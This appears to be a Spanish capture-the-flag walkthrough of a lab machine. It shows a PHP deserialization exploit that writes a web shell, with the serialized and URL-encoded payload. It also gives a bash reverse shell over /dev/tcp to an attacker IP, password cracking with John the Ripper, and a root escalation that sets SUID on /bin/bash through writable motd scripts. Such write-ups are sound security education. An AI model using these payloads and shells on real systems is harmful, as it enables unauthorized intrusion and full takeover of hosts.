### Tags: `PHP` `deseralation` `motd`

# Escaneo (*22, 80*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/6807af1d-d607-4c41-a853-05012d700cf5)


# Port 80 **/** gobuster

Como vimos es un web de **apache por defecto** y por ende vamos a tirar un **Gobuster** para descubrir directorios

```ruby
gobuster dir -q -u http://<ip> -w /usr/share/wordlists/dirb/common.txt   
```

Encontramos un `/backup` y un `index.php`

![image](https://github.com/user-attachments/assets/5ca68162-e2c3-41f4-964e-e0491c9f9f22)

El `index.php` tiene esto:

![image](https://github.com/user-attachments/assets/3f770d4f-1b82-4f04-b745-8c2c91f4c278)

En el `/backup` nos descargamos este archivo a nuestra maquina

![image](https://github.com/user-attachments/assets/3b1e038f-721d-4a75-9977-b4272a6567f6)

Vemos que tenemos una pista en este mensaje de este codigo

```php
<?php

class FormSubmit {

public $form_file = 'message.txt';
public $message = '';

public function SaveMessage() {

$NameArea = $_GET['name']; 
$EmailArea = $_GET['email'];
$TextArea = $_GET['comments'];

        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

}

public function __destruct() {

file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
echo 'Your submission has been successfully saved!';

}

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();


?>
```


El código PHP toma el nombre, el correo electrónico y el comentario que se pasan en el GET mediante un formulario en la página. Utiliza esos valores para crear un mensaje que se escribe en el archivo `message.txt`cuando se destruye el objeto y podemos simplemente ingresar un `$_GET['debug']`parámetro de depuración con la entrada serializada y el código fuente lo deserializará.

![image](https://github.com/user-attachments/assets/b74e76db-6d2b-407e-9813-caa50984d355)


Lo que hacemos ahora es crearnos este **archivo.php**

```php
<?php
class FormSubmit{
        public $form_file = 'pawned.php';
        public $message = '<?php system($_GET["cmd"]); ?>';
}
$obj = new FormSubmit();
echo serialize($obj);
?>
```

Ahora lo probamos y nos da el ``objeto serializado`` ---> comando: `php <nombre_del_archivo>`

```php
O:10:"FormSubmit":2:{s:9:"form_file";s:10:"pawned.php";s:7:"message";s:30:"<?php system($_GET["cmd"]); ?>";}
```

- - `O`  significa objeto
- `O:10`  significa la longitud del nombre del objeto (es decir, ---> 10)
- `2:{`  significa que hay dos propiedades/atributos
- `s:9`  significa que nuestra propiedad/atributo es una cadena y tiene una longitud de 9 caracteres
- `s:9:"form_file";`  Longitud de 9 y nombre de la propiedad


### Cyberchef

Nos copiamos el objeto serializado de antes vamos a [CyberChef](https://gchq.github.io/CyberChef/) y  lo URL encodíamos 

![image](https://github.com/user-attachments/assets/3405e0ad-7e9f-4847-9b81-95b22a41b9be)

Ahora en la web ponemos lo que conseguimos anteriormente de la siguiente manera:

```css
http://<IP>/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A10%3A%22pawned%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A30%3A%22%3C%3Fphp%20system%28%24%5FGET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D
```

Una ves hecho eso, sino vamos a `http://<IP>/pawned.php?cmd=id`

![image](https://github.com/user-attachments/assets/4cd3f4f0-148b-4abb-8b58-0ad2ac7c98c0)

Nos entablamos una reverse shell --> `bash -c "bash -i >%26 /dev/tcp/<ip>/1234 0>%261"`

![image](https://github.com/user-attachments/assets/e6bb672e-c4e1-4a14-a3f8-58a570a11b90)


# Escalada (`james`)

Encontramos la contraseña de james pero no esta en texto plano, entonces tenemos que romperla

![image](https://github.com/user-attachments/assets/73c89fec-63d0-43cb-8fc3-3b18fb85cc91)

Con `John The Ripper` obtuvimos la contraseña -->  `jamaica`

![image](https://github.com/user-attachments/assets/deda4fcc-8d2d-4f11-8def-d18b1eab7242)
![image](https://github.com/user-attachments/assets/e41b5b59-9653-402b-8e6c-1c531440dc53)


# Escalada **ROOT**

Dentro del directorio de **James** y un archivito `Note-To-James.txt` que dice esto:

```txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```

La nota básicamente dice que nos dio acceso para modificar todos estos archivos el Mensaje del día ( `motd`).

![image](https://github.com/user-attachments/assets/b3197963-41de-4be7-a9f7-0db7959b18bd)

Como tenemos todos los permisos lo que hacemos es abrirno un archivo y poner:

```bash
chmod u+s /bin/bash
```

![image](https://github.com/user-attachments/assets/3ad7b478-ce40-4317-94df-7c61f2b4a65b)

Ahora volvés a entrar a la máquina por **SSH** y ponemos esto:

```bash
ssh@james<IP>
bash -p
```

![image](https://github.com/user-attachments/assets/e989d26f-27bb-40dd-bbfc-ee14005d919b)








